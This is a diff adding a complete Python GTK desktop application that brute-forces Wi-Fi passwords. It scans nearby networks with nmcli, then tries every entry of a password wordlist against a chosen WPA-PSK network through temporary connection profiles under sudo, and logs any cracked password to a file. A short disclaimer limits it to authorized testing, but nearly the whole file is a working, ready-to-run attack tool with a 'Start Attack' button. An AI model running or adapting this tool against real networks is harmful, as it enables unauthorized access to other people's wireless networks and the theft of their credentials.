@@ -1,0 +1,768 @@
+#!/usr/bin/env python3
+"""
+WiFi Brute Force Application - For Educational and Authorized Testing Only
+
+This tool is intended for legitimate security testing of networks you own or
+have explicit permission to test. Unauthorized use against networks without 
+permission is illegal in most jurisdictions and could result in criminal charges.
+
+Use responsibly and ethically.
+"""
+
+import gi
+gi.require_version('Gtk', '3.0')
+from gi.repository import Gtk, GLib, Pango
+import subprocess
+import time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from threading import Lock, Event
+import datetime
+import os
+
+class WifiBruteForceApp(Gtk.Window):
+    def __init__(self):
+        super().__init__(title="WiFi Brute Force")
+        self.lock = Lock()
+        self.password_found_event = Event()
+        self.abort_requested = Event()  # Flag to signal when abort is requested
+        self.networks = []
+        self.passwords = []
+        self.selected_network = None
+        self.executor = ThreadPoolExecutor(max_workers=90)
+        self.original_connection = None  # Store original connection
+        
+        # Connect the delete-event to our close handler
+        self.connect("delete-event", self.on_window_delete)
+        
+        # Set up the main window
+        self.set_border_width(10)
+        self.set_default_size(600, 400)
+        
+        # Create main vertical box
+        main_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6)
+        self.add(main_box)
+        
+        # Password file selection with browse button
+        file_box = Gtk.Box(spacing=6)
+        file_label = Gtk.Label(label="📁 Password File:")
+        self.password_file_entry = Gtk.Entry()
+        self.password_file_entry.set_text("default.txt")
+        browse_button = Gtk.Button(label="Browse")
+        browse_button.connect("clicked", self.on_browse_clicked)
+        file_box.pack_start(file_label, False, False, 0)
+        file_box.pack_start(self.password_file_entry, True, True, 0)
+        file_box.pack_start(browse_button, False, False, 0)
+        main_box.pack_start(file_box, False, False, 0)
+        
+        # Scan button with icon
+        self.scan_button = Gtk.Button(label="🔍 Scan Networks")
+        self.scan_button.connect("clicked", self.on_scan_clicked)
+        main_box.pack_start(self.scan_button, False, False, 0)
+        
+        # Network selection combo box
+        network_box = Gtk.Box(spacing=6)
+        network_label = Gtk.Label(label="📡 Network:")
+        self.network_combo = Gtk.ComboBoxText()
+        network_box.pack_start(network_label, False, False, 0)
+        network_box.pack_start(self.network_combo, True, True, 0)
+        main_box.pack_start(network_box, False, False, 0)
+        
+        # Progress bar
+        self.progress_bar = Gtk.ProgressBar()
+        self.progress_bar.set_text("Ready")
+        self.progress_bar.set_show_text(True)
+        main_box.pack_start(self.progress_bar, False, False, 0)
+        
+        # Status text view
+        scrolled = Gtk.ScrolledWindow()
+        scrolled.set_hexpand(True)
+        scrolled.set_vexpand(True)
+        self.status_view = Gtk.TextView()
+        self.status_view.set_editable(False)
+        self.status_view.set_wrap_mode(Gtk.WrapMode.WORD)
+        scrolled.add(self.status_view)
+        main_box.pack_start(scrolled, True, True, 0)
+        
+        # Button row for Start and Abort
+        button_box = Gtk.Box(spacing=10)
+        
+        # Start button with icon
+        self.start_button = Gtk.Button(label="⚡ Start Attack")
+        self.start_button.connect("clicked", self.on_start_clicked)
+        self.start_button.set_sensitive(False)
+        button_box.pack_start(self.start_button, True, True, 0)
+        
+        # Abort button with icon
+        self.abort_button = Gtk.Button(label="🛑 Abort")
+        self.abort_button.connect("clicked", self.on_abort_clicked)
+        self.abort_button.set_sensitive(False)  # Disabled until attack/scan starts
+        button_box.pack_start(self.abort_button, True, True, 0)
+        
+        main_box.pack_start(button_box, False, False, 0)
+
+    def check_sudo_privileges(self):
+        """Check if the user has sudo privileges before performing network operations."""
+        self.update_status("🔐 Checking for sudo privileges...", "info")
+        try:
+            # Simple test command that requires sudo
+            result = subprocess.run(
+                ['sudo', '-n', 'true'],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=2
+            )
+            
+            if result.returncode != 0:
+                self.update_status("⚠️ Please enter your sudo password in the terminal if prompted", "warning")
+                # Run a dummy sudo command to trigger password prompt
+                subprocess.run(['sudo', 'echo', 'Authenticated successfully'], timeout=30)
+                self.update_status("✅ Authentication successful", "success")
+            else:
+                self.update_status("✅ Sudo privileges already available", "success")
+                
+            return True
+        except subprocess.TimeoutExpired:
+            self.update_status("❌ Authentication timed out", "error")
+            return False
+        except Exception as e:
+            self.update_status(f"❌ Authentication error: {e}", "error")
+            return False
+
+    def on_browse_clicked(self, button):
+        """Handle browse button click."""
+        dialog = Gtk.FileChooserDialog(
+            title="Please choose a password file",
+            parent=self,
+            action=Gtk.FileChooserAction.OPEN
+        )
+        dialog.add_buttons(
+            Gtk.STOCK_CANCEL, Gtk.ResponseType.CANCEL,
+            Gtk.STOCK_OPEN, Gtk.ResponseType.OK
+        )
+        
+        response = dialog.run()
+        if response == Gtk.ResponseType.OK:
+            self.password_file_entry.set_text(dialog.get_filename())
+        dialog.destroy()
+
+    def update_status(self, message, message_type="info"):
+        """Updates the status display with a new message.
+        
+        Args:
+            message: The message to display
+            message_type: Type of message - "info", "error", "warning", or "success"
+        """
+        def do_update():
+            buffer = self.status_view.get_buffer()
+            end_iter = buffer.get_end_iter()
+            timestamp = time.strftime("[%H:%M:%S] ")
+            
+            # Create text tag for different message types if they don't exist
+            tag_table = buffer.get_tag_table()
+            
+            if not tag_table.lookup("error"):
+                buffer.create_tag("error", foreground="red", weight=Pango.Weight.BOLD)
+            if not tag_table.lookup("warning"):
+                buffer.create_tag("warning", foreground="orange")
+            if not tag_table.lookup("success"):
+                buffer.create_tag("success", foreground="green", weight=Pango.Weight.BOLD)
+                
+            # Insert text with appropriate tag
+            buffer.insert(end_iter, timestamp)
+            
+            if message_type == "error":
+                buffer.insert_with_tags_by_name(end_iter, message + "\n", "error")
+            elif message_type == "warning":
+                buffer.insert_with_tags_by_name(end_iter, message + "\n", "warning")
+            elif message_type == "success":
+                buffer.insert_with_tags_by_name(end_iter, message + "\n", "success")
+            else:
+                buffer.insert(end_iter, message + "\n")
+                
+            # Scroll to bottom
+            mark = buffer.create_mark(None, buffer.get_end_iter(), False)
+            self.status_view.scroll_to_mark(mark, 0.0, True, 0.0, 1.0)
+            return False  # Important: return False to ensure it's run only once
+        GLib.idle_add(do_update)
+        return True  # Used for the callback in update_status_safely
+
+    def cleanup_temp_profiles(self):
+        """Removes all temporary profiles matching the pattern temp-*."""
+        try:
+            result = subprocess.run(['sudo', 'nmcli', '-t', '-f', 'NAME', 'con', 'show'],
+                                  stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=10)
+            output = result.stdout.decode('utf-8').strip()
+
+            deleted_count = 0
+            for line in output.split('\n'):
+                if line and line.startswith("temp-"):
+                    try:
+                        subprocess.run(['sudo', 'nmcli', 'con', 'delete', line],
+                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+                        deleted_count += 1
+                    except subprocess.TimeoutExpired:
+                        self.update_status(f"⚠️ Timeout while deleting profile: {line}", "warning")
+                    except Exception as inner_e:
+                        self.update_status(f"⚠️ Failed to delete profile {line}: {inner_e}", "warning")
+            
+            if deleted_count > 0:
+                self.update_status(f"🧹 {deleted_count} temporary profiles cleaned up.", "success")
+            
+        except subprocess.TimeoutExpired:
+            self.update_status("❌ Timeout during profile cleanup - command took too long", "error")
+        except Exception as e:
+            self.update_status(f"❌ Error cleaning up profiles: {e}", "error")
+
+    def scan_networks(self):
+        """Lists available Wi-Fi networks with improved error handling."""
+        # Enable abort button during scan
+        GLib.idle_add(lambda: self.abort_button.set_sensitive(True))
+        
+        # Check for sudo privileges first
+        if not self.check_sudo_privileges():
+            self.update_status("❌ Cannot scan networks without sudo privileges", "error")
+            GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+            GLib.idle_add(lambda: self.abort_button.set_sensitive(False))
+            return
+            
+        # Reset abort flag before starting scan
+        self.abort_requested.clear()
+            
+        try:
+            self.scan_button.set_sensitive(False)
+            self.start_button.set_sensitive(False)
+            self.update_status("🔍 Scanning for networks...", "info")
+            
+            # First try to rescan WiFi networks to refresh the list
+            try:
+                # Check if abort was requested
+                if self.abort_requested.is_set():
+                    self.update_status("🛑 Scan aborted by user", "warning")
+                    GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+                    GLib.idle_add(lambda: self.abort_button.set_sensitive(False))
+                    return
+                    
+                subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'rescan'],
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+                # Wait a bit for the scan to complete
+                time.sleep(2)
+            except Exception as scan_error:
+                self.update_status(f"⚠️ Rescan might have failed: {scan_error}", "warning")
+            
+            # Get wireless interface
+            if not hasattr(self, 'wireless_interface'):
+                self.wireless_interface = self.get_wireless_interface()
+            
+            # Now get the list of networks
+            result = subprocess.run(['sudo', 'nmcli', '-t', '-f', 'SSID,SECURITY,SIGNAL', 'device', 'wifi', 'list'],
+                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15)
+            
+            if result.returncode != 0:
+                error_output = result.stderr.decode('utf-8').strip()
+                self.update_status(f"❌ Network scan command failed: {error_output}", "error")
+                GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+                return
+                
+            output = result.stdout.decode('utf-8').strip()
+            
+            if not output:
+                self.update_status("⚠️ No networks found. Are you sure WiFi is enabled?", "warning")
+                GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+                return
+                
+            networks = {}
+            
+            for line in output.split('\n'):
+                if line:
+                    parts = line.split(':')
+                    if len(parts) < 3:
+                        continue  # Skip malformed lines
+                        
+                    ssid = parts[0]
+                    security = parts[1] if parts[1] else 'None'
+                    signal = parts[2] if parts[2] else '0'
+                    
+                    # Skip empty SSIDs
+                    if not ssid:
+                        continue
+                        
+                    # Use the strongest signal for duplicate SSIDs
+                    if ssid in networks:
+                        try:
+                            current_signal = int(networks[ssid]['signal'])
+                            new_signal = int(signal)
+                            if new_signal > current_signal:
+                                networks[ssid] = {'security': security, 'signal': signal}
+                        except ValueError:
+                            # If signal can't be parsed as int, keep the existing entry
+                            pass
+                    else:
+                        networks[ssid] = {'security': security, 'signal': signal}
+            
+            if not networks:
+                self.update_status("⚠️ No valid networks found after parsing.", "warning")
+                GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+                return
+            
+            # Sort networks by signal strength (highest first)
+            sorted_networks = sorted(
+                [(ssid, details) for ssid, details in networks.items()],
+                key=lambda x: int(x[1]['signal']),
+                reverse=True
+            )
+            
+            self.networks = [{
+                'ssid': ssid,
+                'security': details['security'],
+                'signal': details['signal']
+            } for ssid, details in sorted_networks]
+            
+            GLib.idle_add(self.update_network_list)
+            
+        except subprocess.TimeoutExpired:
+            self.update_status("❌ Network scan timed out. Try again or check your WiFi adapter.", "error")
+            GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+        except Exception as e:
+            self.update_status(f"❌ Error scanning networks: {e}", "error")
+            GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+
+    def update_network_list(self):
+        """Updates the network combo box with found networks."""
+        self.network_combo.remove_all()
+        for net in self.networks:
+            # Format: SSID (Security Type, Signal: XX%)
+            network_text = f"{net['ssid']} ({net['security']}, Signal: {net['signal']}%)"
+            self.network_combo.append_text(network_text)
+        self.start_button.set_sensitive(True)
+        self.scan_button.set_sensitive(True)
+        self.update_status(f"📡 Found {len(self.networks)} networks")
+
+    def on_scan_clicked(self, _):
+        """Handle scan button click."""
+        self.save_original_connection()  # Save the current connection before scanning
+        self.executor.submit(self.scan_networks)
+
+    def read_passwords(self, filename):
+        """Reads passwords from a file with improved error handling."""
+        try:
+            with open(filename, 'r', encoding='utf-8') as file:
+                passwords = [line.strip() for line in file if line.strip()]
+                
+            if not passwords:
+                self.update_status(f"⚠️ Warning: Password file {filename} is empty.", "warning")
+                return []
+                
+            # Remove duplicates while preserving order
+            unique_passwords = []
+            seen = set()
+            for password in passwords:
+                if password not in seen:
+                    seen.add(password)
+                    unique_passwords.append(password)
+            
+            if len(unique_passwords) < len(passwords):
+                self.update_status(f"ℹ️ Removed {len(passwords) - len(unique_passwords)} duplicate passwords.", "info")
+                
+            self.update_status(f"✅ Loaded {len(unique_passwords)} unique passwords from {filename}", "success")
+            return unique_passwords
+            
+        except FileNotFoundError:
+            self.update_status(f"❌ Error: File {filename} not found.", "error")
+            return []
+        except UnicodeDecodeError:
+            self.update_status(f"❌ Error: File {filename} has invalid encoding. Try UTF-8 format.", "error")
+            return []
+        except PermissionError:
+            self.update_status(f"❌ Error: Permission denied when reading {filename}.", "error")
+            return []
+        except Exception as e:
+            self.update_status(f"❌ Error reading password file: {e}", "error")
+            return []
+
+    def connect_to_wifi_with_profile(self, ssid, password, attempt_id):
+        """Creates a unique temporary profile to connect to a Wi-Fi network."""
+        if self.password_found_event.is_set() or self.abort_requested.is_set():
+            return None
+
+        # Create a safe profile name without special characters
+        safe_ssid = ''.join(c for c in ssid if c.isalnum())
+        profile_name = f"temp-{safe_ssid}-{attempt_id}"
+        
+        # Get the wireless interface
+        if not hasattr(self, 'wireless_interface'):
+            self.wireless_interface = self.get_wireless_interface()
+
+        try:
+            self.update_status(f"🔑 Trying password: {password}...")
+
+            # Sleep briefly to allow UI to update and avoid network congestion
+            time.sleep(0.5)
+            
+            with self.lock:
+                # Create connection profile with dynamic interface detection
+                create_cmd = [
+                    'sudo', 'nmcli', 'con', 'add', 'type', 'wifi', 'con-name', profile_name,
+                    'ifname', self.wireless_interface, 'ssid', ssid,
+                    'wifi-sec.key-mgmt', 'wpa-psk', 'wifi-sec.psk', password
+                ]
+                
+                create_result = subprocess.run(
+                    create_cmd,
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE, 
+                    timeout=5
+                )
+                
+                # Check if profile creation was successful
+                if create_result.returncode != 0:
+                    error_msg = create_result.stderr.decode('utf-8').strip()
+                    if "already exists" in error_msg:
+                        # Try to delete and recreate
+                        subprocess.run(['sudo', 'nmcli', 'con', 'delete', profile_name],
+                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                        subprocess.run(create_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                             
+                # Add a short delay to ensure profile is created before connection attempt
+                time.sleep(0.2)
+
+                # Try to connect
+                result = subprocess.run(
+                    ['sudo', 'nmcli', 'con', 'up', profile_name],
+                    stdout=subprocess.PIPE, 
+                    stderr=subprocess.PIPE, 
+                    timeout=5
+                )
+                output = result.stdout.decode('utf-8').strip()
+                error_output = result.stderr.decode('utf-8').strip()
+
+                # Add a short delay before cleanup
+                time.sleep(0.2)
+                
+                # Delete the temporary profile
+                subprocess.run(
+                    ['sudo', 'nmcli', 'con', 'delete', profile_name],
+                    stdout=subprocess.DEVNULL, 
+                    stderr=subprocess.DEVNULL
+                )
+
+            if result.returncode == 0 and "successfully activated" in output:
+                self.password_found_event.set()
+                self.update_status(f"🎉 Success: Connected to {ssid}!", "success")
+                return password
+            elif error_output and ("Password required" in error_output or "Secrets were required" in error_output):
+                # This is an expected error for wrong passwords, no need to log it
+                return None
+            else:
+                # Log unexpected errors
+                if error_output:
+                    self.update_status(f"Error connecting: {error_output}", "warning")
+                return None
+        except subprocess.TimeoutExpired:
+            self.update_status(f"⚠️ Timeout when trying: {password}", "warning")
+            try:
+                # Attempt to clean up the profile even if there was a timeout
+                with self.lock:
+                    subprocess.run(['sudo', 'nmcli', 'con', 'delete', profile_name],
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
+            return None
+        except Exception as e:
+            # Log the specific error
+            self.update_status(f"Error with password {password}: {str(e)}", "error")
+            try:
+                # Attempt to clean up the profile even if there was an error
+                with self.lock:
+                    subprocess.run(['sudo', 'nmcli', 'con', 'delete', profile_name],
+                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except:
+                pass
+            return None
+
+    def update_progress_safely(self, progress, text):
+        """Update progress bar in a thread-safe way"""
+        def update():
+            self.progress_bar.set_fraction(progress)
+            self.progress_bar.set_text(text)
+            return False  # Important: return False to ensure it's run only once
+        GLib.idle_add(update)
+
+    def update_status_safely(self, message):
+        """Update status in a thread-safe way"""
+        GLib.idle_add(lambda: self.update_status(message) and False)
+
+    def test_passwords_parallel(self, ssid, passwords):
+        """Tests passwords in parallel using ThreadPoolExecutor."""
+        self.password_found_event.clear()  # Reset the event
+        total_passwords = len(passwords)
+        completed = 0
+        success_password = None
+        
+        # Use fewer workers to avoid overwhelming the system
+        with ThreadPoolExecutor(max_workers=1) as executor:
+            # Process one password at a time for stability
+            batch_size = 1
+            
+            for i in range(0, len(passwords), batch_size):
+                # Check if abort was requested
+                if self.abort_requested.is_set():
+                    self.update_status_safely("🛑 Attack aborted by user")
+                    break
+                
+                if self.password_found_event.is_set():
+                    # We found a password, exit the loop
+                    break
+                    
+                # Get the current batch of passwords
+                current_batch = passwords[i:i+batch_size]
+                futures_dict = {}
+                
+                # Submit the batch - only one password at a time now
+                for idx, password in enumerate(current_batch):
+                    if self.password_found_event.is_set() or self.abort_requested.is_set():
+                        break
+                    attempt_id = i + idx
+                    future = executor.submit(self.connect_to_wifi_with_profile, ssid, password, attempt_id)
+                    futures_dict[future] = password
+                
+                # Process the batch results
+                for future in as_completed(futures_dict):
+                    try:
+                        # Get result from future
+                        result = future.result()
+                        # Update progress
+                        completed += 1
+                        progress = min(completed / total_passwords, 1.0)
+                        progress_text = f"{int(progress * 100)}%"
+                        
+                        # Update UI safely
+                        self.update_progress_safely(progress, progress_text)
+                        
+                        # Check if we found the password
+                        if result:
+                            success_password = result
+                            self.update_status_safely(f"\n✅ Connected to {ssid} successfully with password: {result}")
+                            self.update_status_safely(f"⏰ End time: {datetime.datetime.now()}")
+                            try:
+                                with open('wifi_success.log', 'a') as log_file:
+                                    log_file.write(
+                                        f"{time.strftime('%Y-%m-%d %H:%M:%S')} - SSID: {ssid}, Password: {result}\n")
+                            except Exception as e:
+                                print(f"Error writing to log: {e}")
+                            # Set event to stop other attempts
+                            self.password_found_event.set()
+                            # Break out immediately
+                            break
+                            
+                    except Exception as e:
+                        print(f"Error testing password: {e}")
+                        
+                # Check again if password was found - break out of main loop if it was
+                if self.password_found_event.is_set():
+                    break
+                
+                # Small delay between attempts
+                time.sleep(0.2)
+            
+        # Cleanup temp profiles
+        self.cleanup_temp_profiles()
+        
+        # Return the result
+        if success_password:
+            self.update_status_safely(f"✅ Attack successful! Password found: {success_password}")
+            return success_password
+        else:
+            self.update_status_safely(f"❌ Attack complete. No valid password found for {ssid}.")
+            self.update_progress_safely(1.0, "100% Complete")
+            return None
+
+    def start_attack(self):
+        """Starts the brute force attack."""
+        # Check for sudo privileges first
+        if not self.check_sudo_privileges():
+            self.update_status("❌ Cannot start attack without sudo privileges", "error")
+            return
+            
+        self.save_original_connection()  # Save the current connection before starting the attack
+        active_id = self.network_combo.get_active()
+        if active_id == -1:
+            self.update_status("⚠️ Please select a network first.")
+            return
+
+        # Get selected network SSID
+        self.selected_network = self.networks[active_id]['ssid']  # Get just the SSID
+        ssid = self.selected_network
+
+        # Read passwords
+        password_file = self.password_file_entry.get_text() or 'default.txt'
+        self.passwords = self.read_passwords(password_file)
+        
+        if not self.passwords:
+            self.update_status("⚠️ No passwords loaded. Please check the password file.")
+            return
+
+        self.update_status(f"🎯 Starting attack on network: {ssid}")
+        self.update_status(f"⏰ Start time: {datetime.datetime.now()}")
+        
+        # Reset progress bar
+        self.progress_bar.set_fraction(0)
+        self.progress_bar.set_text("Starting...")
+        
+        # Clear password found event
+        self.password_found_event.clear()
+        
+        # Disable buttons during attack
+        self.start_button.set_sensitive(False)
+        self.scan_button.set_sensitive(False)
+        
+        try:
+            result = self.test_passwords_parallel(ssid, self.passwords)
+        except Exception as e:
+            self.update_status(f"❌ An error occurred: {e}")
+        finally:
+            # Re-enable buttons
+            GLib.idle_add(lambda: self.start_button.set_sensitive(True))
+            GLib.idle_add(lambda: self.scan_button.set_sensitive(True))
+            
+            # Restore the original connection
+            self.restore_original_connection()
+            
+            # Update progress bar
+            if self.password_found_event.is_set():
+                GLib.idle_add(lambda: self.progress_bar.set_text("Success!"))
+            else:
+                GLib.idle_add(lambda: self.progress_bar.set_text("Ready"))
+
+    def on_start_clicked(self, _):
+        """Handle start button click."""
+        # Reset abort flag before starting
+        self.abort_requested.clear()
+        # Enable abort button when attack starts
+        self.abort_button.set_sensitive(True)
+        self.executor.submit(self.start_attack)
+    
+    def on_abort_clicked(self, _):
+        """Handle abort button click."""
+        self.update_status("🛑 Abort requested! Stopping operation...", "warning")
+        self.abort_requested.set()  # Signal to all running operations that they should stop
+        
+        # Disable the abort button immediately to prevent multiple clicks
+        self.abort_button.set_sensitive(False)
+        
+        # Schedule a function to check and re-enable buttons after a short delay
+        GLib.timeout_add(2000, self.finalize_abort)
+    
+    def finalize_abort(self):
+        """Finalize the abort operation by resetting UI and cleaning up."""
+        # Re-enable buttons
+        self.scan_button.set_sensitive(True)
+        self.start_button.set_sensitive(True if len(self.networks) > 0 else False)
+        
+        # Reset progress bar
+        self.update_progress_safely(0, "Aborted")
+        
+        # Wait a moment for any in-progress operations to complete
+        time.sleep(1)
+        
+        # Run cleanup first to remove any temporary profiles that might still be active
+        self.cleanup_temp_profiles()
+        
+        # Now restore the original connection after cleanup
+        self.restore_original_connection()
+        
+        self.update_status("✅ Operation aborted successfully", "success")
+        return False  # to ensure it only runs once
+    
+    def cleanup_and_exit(self):
+        """Clean up resources and exit properly."""
+        print("\nCleaning up and exiting...")
+        self.cleanup_temp_profiles()
+        self.restore_original_connection()  # Restore the original connection on exit
+        self.executor.shutdown(wait=False)
+        Gtk.main_quit()
+        os._exit(0)  # Force exit to terminate all threads
+
+    def on_window_delete(self, widget, event):
+        """Handle window close button click"""
+        self.cleanup_and_exit()
+        return False
+
+    def get_wireless_interface(self):
+        """Detect the active wireless interface instead of hardcoding wlan0."""
+        try:
+            result = subprocess.run(['nmcli', '-t', '-f', 'DEVICE,TYPE', 'device'],
+                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
+            output = result.stdout.decode('utf-8').strip()
+            
+            for line in output.split('\n'):
+                if line and ':wifi' in line:
+                    interface = line.split(':')[0]
+                    self.update_status(f"📡 Using wireless interface: {interface}", "info")
+                    return interface
+            
+            # Default fallback
+            self.update_status("⚠️ No wireless interface detected, defaulting to wlan0", "warning")
+            return "wlan0"
+        except Exception as e:
+            self.update_status(f"❌ Error detecting wireless interface: {e}", "error")
+            return "wlan0"  # Fallback
+
+    def save_original_connection(self):
+        """Save the current active network connection before scanning/testing."""
+        try:
+            # Get the active connection info
+            result = subprocess.run(
+                ['nmcli', '-t', '-f', 'NAME,TYPE,DEVICE', 'connection', 'show', '--active'],
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE, 
+                timeout=5
+            )
+            
+            if result.returncode != 0:
+                self.update_status("⚠️ Could not determine active connection", "warning")
+                return
+                
+            output = result.stdout.decode('utf-8').strip()
+            for line in output.split('\n'):
+                if ':wifi:' in line:  # Find the active WiFi connection
+                    self.original_connection = line.split(':')[0]
+                    self.update_status(f"📡 Saved original connection: {self.original_connection}", "info")
+                    return
+                    
+            self.update_status("ℹ️ No active WiFi connection found to save", "info")
+        except Exception as e:
+            self.update_status(f"⚠️ Error saving original connection: {e}", "warning")
+    
+    def restore_original_connection(self):
+        """Restore the original network connection after operations are complete."""
+        if not self.original_connection:
+            return
+            
+        try:
+            self.update_status(f"🔄 Restoring connection to: {self.original_connection}", "info")
+            
+            # Use regular user permissions (no sudo) to reconnect to the original network
+            result = subprocess.run(
+                ['nmcli', 'connection', 'up', self.original_connection],
+                stdout=subprocess.PIPE, 
+                stderr=subprocess.PIPE, 
+                timeout=10
+            )
+            
+            if result.returncode == 0:
+                self.update_status(f"✅ Successfully reconnected to {self.original_connection}", "success")
+            else:
+                error = result.stderr.decode('utf-8').strip()
+                self.update_status(f"⚠️ Could not restore connection: {error}", "warning")
+                
+        except Exception as e:
+            self.update_status(f"⚠️ Error restoring connection: {e}", "warning")
+
+def main():
+    app = WifiBruteForceApp()
+    app.connect("destroy", Gtk.main_quit)
+    app.show_all()
+    Gtk.main()
+
+if __name__ == "__main__":
+    main()
